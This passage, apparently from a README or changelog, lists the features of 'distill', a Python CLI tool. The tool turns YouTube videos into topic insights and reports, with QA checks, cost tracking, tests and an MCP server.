- Anti-hallucination prompting and QA checks
- Primary source citations required (not Wikipedia, not numbered `[cite: N]`)
- Creator estimate/opinion separation (`[Estimated]` vs `[Confirmed]`)
- Bias detection (QA flags inherited bullishness/bearishness without counterweight)
- Readability enforcement (short paragraphs, tables, subheadings)
- Cross-section dedup (full previous-section context, explicit no-repeat rules)
- Tagged source material (vendor insights, enterprise data, syntheses per section)
- DOCX export (professional report with cover page, TOC, page numbers, confidence badges)
- Report scoping (`--focus`, `--test`, `--legacy`, `--research-only`, `--sections`, `--no-qa`)
- File Search store bundling and cleanup (auto after run; `distill cleanup` for orphans)
- Report resume hardening (safe File Search upload staging, normalized operation polling, Windows-safe console output)

### Topic Discovery and Learning

- Human-readable video directories (slugified titles + `distill migrate`)
- Power commands: `distill video`, `distill channel`, `distill search`, `distill explore`, `distill latest`, `distill learn`, `distill brief`
- Browser-based YouTube search retrieval (Playwright) with fallback parsing
- Query expansion, metadata enrichment, and best-pick reranking for topic learning
- Exact-hour YouTube discovery windows (`--hours`) for stay-current workflows
- Skeptical multi-query selection for rumor-heavy and April 1 topic runs
- Topic diff and change-history artifacts (`distill diff`, `topic_diff.md`, `change_history.jsonl`)
- Trend detection over recorded diff windows (`distill trends`)

### Packaging and CLI

- `pyproject.toml` with `[project.scripts]` so `pip install -e .` exposes `distill` as a command
- Resolved module name collision (`distill.py` -> `distill/cli.py`)
- `.gitignore` and `.env.example` for clean project setup
- Cross-platform setup script (`setup_distill.py`): installs the package, Chromium, API keys, validates everything
- `setup_distill.py --check` mode for re-validation without changes
- Live API key testing with smart error categorization (auth vs rate-limit vs timeout)

### Post-Run Summary and Observability

- Rich summary panel after every command - items processed, time elapsed, actual cost, pass/fail counts
- Clickable `file://` links to outputs (insights, synthesis, report, DOCX)
- Failed-item list with reasons in the summary panel
- `distill open` - open topic/channel/output folders and files in the system file browser
- `distill` with no args shows a quick dashboard (topics, channels, counts, quick commands)
- Cost tracking - actual token usage per API call, per-call-type breakdowns
- `distill costs` command - cost-history table with per-run token/timing breakdowns
- `--dry-run` shows projected spend with full/Shorts breakdown
- Run cost log (`cost_log.jsonl`) - estimated vs actual costs for calibration
- Timeouts and retries on all API calls for transient-failure resilience

### UX and Testing

- Tab-completion for topic and channel names across all commands (Typer `autocompletion`)
- Smart `show` command accepts channel name as positional arg
- Contextual "what's next" hints after every command (file paths, navigation, follow-up commands)
- Rich progress bar with ETA during long runs
- Color-coded video status in `videos` listing
- Integration tests hitting real YouTube (`@pytest.mark.integration`, skipped by default)
- Contract tests validating yt-dlp field assumptions
- `distill doctor` tests API connectivity with live calls (not just key presence)

### MCP Server

- `distill/mcp_server.py` exposing core functionality via Model Context Protocol
- 8 tools: `catch_up`, `search_videos`, `learn_topic`, `process_video_url`, `watch_add`, `watch_remove`, `generate_report`, `resynthesize_topic`
- 7 resources: topics, watchlist, topic videos, topic/channel synthesis, video insights, costs
- 3 prompts: `daily_deals`, `morning_briefing`, `topic_research`
- `distill-mcp` entry point (stdio transport for Claude Desktop and IDE integrations)
